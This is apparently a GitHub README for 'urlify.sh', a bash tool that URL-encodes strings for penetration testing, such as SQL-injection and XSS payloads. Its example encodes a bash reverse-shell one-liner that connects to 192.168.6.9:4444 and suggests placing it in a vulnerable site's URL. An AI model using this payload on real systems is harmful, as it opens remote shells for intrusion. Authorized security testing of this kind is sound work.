# URL-ify your string
Simple bash script-tool that converts a piece of string into its URL-encoded version, replacing spaces by `%20`, double quotes by `%22`, etc.

Converts **all ASCII characters** into their UTF-8 encoded version except for:
- Uppercase and lowercase letters (A-Za-z)
- Numbers (0-9)
- The following characters, which don't need the conversion: `-` `.` `_` `~`.

# Useful for
Encoding payloads that will be used in some cases of SQL-injections, Reflected XSS, or, perhaps, simple cURLs.

Also useful for crafting HTTP requests.

# Example
Once we've downloaded the file and added execution permissions (`chmod +x urlify.sh`), we can try and transform the classical Reverse TCP Bash Shell into its URLified version:
```sh
# Don't forget to capture double quotes with a backslash! \
urlify.sh "bash -c \"bash -i >& /dev/tcp/192.168.6.9/4444 0>&1\""
```
Will yield:
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.6.9%2F4444%200%3E%261%22
```
Which we can directly insert into BurpSuite's Responder, or that one vulnerable website's URL!

### But, remember, **only use this on devices that you own or that you're authorized to test**.
